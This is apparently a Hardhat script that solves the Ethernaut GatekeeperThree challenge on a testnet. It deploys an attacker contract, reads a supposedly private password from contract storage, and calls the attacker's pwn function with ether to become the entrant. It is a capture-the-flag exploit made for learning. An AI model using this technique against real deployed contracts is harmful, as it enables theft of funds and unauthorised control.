// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// You can also run a script with `npx hardhat run <script>`. If you do that, Hardhat
// will compile your contracts, add the Hardhat Runtime Environment's members to the
// global scope, and execute the script.
require('dotenv').config({ path: __dirname + '/.env' });

const { ethers } = require("hardhat");

async function main() {
    [player] = await ethers.getSigners();
    hacker = await (await ethers.getContractFactory("GatekeeperThreeHacker")).deploy(process.env.GATEKEEPERTHREE_ADDRESS);
    hacker.deployed();
    gatekeeperThree = await ethers.getContractAt("GatekeeperThree", process.env.GATEKEEPERTHREE_ADDRESS);

    transactionResponse = await gatekeeperThree.createTrick();
    await transactionResponse.wait();
    trickAddr = await gatekeeperThree.trick();
    password = await ethers.provider.getStorageAt(trickAddr, 2);
    transactionResponse = await hacker.pwn(password, {value: ethers.utils.parseEther("0.0011")});
    await transactionResponse.wait();
    console.log("entrant of gatekeeperThree is ", await gatekeeperThree.entrant());
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});
// run this script after Fallback contract was deployed
// npx hardhat run scripts/deploy.js --network goerli